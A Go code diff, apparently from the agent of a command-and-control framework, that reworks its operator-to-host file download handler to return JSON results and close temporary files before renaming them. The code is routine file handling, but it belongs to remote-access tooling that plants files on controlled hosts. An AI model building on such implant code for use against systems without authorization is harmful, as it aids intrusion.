@@ -69,10 +69,16 @@ func (c *FileCommand) Execute(task *Task) ([]byte, error) {
 		return handleUpload(args.Path)
 	case "download": // Agent writes to local file (Operator Upload)
 		err := handleDownload(task.TaskID, args)
-		if err != nil {
-			return nil, err
+		// 返回 JSON 格式结果，TeamServer 期望解析
+		result := map[string]interface{}{
+			"destination": args.Destination,
+			"file_size":   args.FileSize,
+			"success":     err == nil,
 		}
-		return []byte("File downloaded successfully."), nil
+		if err != nil {
+			result["error"] = err.Error()
+		}
+		return json.Marshal(result)
 	case "list":
 		return handleBrowse(args.Path)
 	case "rm":
@@ -150,7 +156,7 @@ func handleDownload(taskID string, args FileOpArgs) error {
 	if err != nil {
 		return fmt.Errorf("could not create temporary file %s: %v", tempFilePath, err)
 	}
-	defer destFile.Close()
+	// 注意：不使用 defer，因为需要在重命名前显式关闭文件
 
 	// Calculate total chunks and loop
 	totalChunks := (args.FileSize + int64(args.ChunkSize) - 1) / int64(args.ChunkSize)
@@ -160,15 +166,23 @@ func handleDownload(taskID string, args FileOpArgs) error {
 	for i := int64(0); i < totalChunks; i++ {
 		chunkData, err := chunkDownloader.DownloadChunk(taskID, i)
 		if err != nil {
+			destFile.Close()
 			os.Remove(tempFilePath)
 			return fmt.Errorf("failed to download chunk %d: %v", i, err)
 		}
 
 		if _, err := destFile.Write(chunkData); err != nil {
+			destFile.Close()
 			os.Remove(tempFilePath)
 			return fmt.Errorf("failed to write chunk %d to temporary file: %v", i, err)
 		}
 		log.Printf("Downloaded and wrote chunk %d/%d", i+1, totalChunks)
+	}
+
+	// 关闭文件后再重命名（特别是 Windows 需要先关闭文件句柄）
+	if err := destFile.Close(); err != nil {
+		os.Remove(tempFilePath)
+		return fmt.Errorf("failed to close temporary file: %v", err)
 	}
 
 	// Rename file
